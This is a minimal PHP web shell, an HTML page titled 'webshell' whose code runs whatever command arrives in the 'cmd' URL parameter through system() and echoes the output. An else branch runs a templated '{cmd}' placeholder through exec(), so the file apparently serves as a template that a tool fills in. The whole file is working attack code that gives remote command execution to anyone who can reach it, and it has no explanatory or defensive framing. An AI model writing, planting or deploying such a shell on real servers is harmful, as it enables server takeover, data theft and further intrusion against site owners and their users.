<html>
<head>
    <title>webshell</title>
</head>
<body>
    <pre>
    <?php    
        if (isset($_GET['cmd'])) {
            system($_GET['cmd'] . ' 2>&1');
        }
        else {
            exec("{cmd}", $output, $return); 
            echo implode("\n", $output);
            if ($return !== 0) {
                echo "Command failed with return code: $return";
            }
        }
    ?>
    </pre>
</body>
</html>
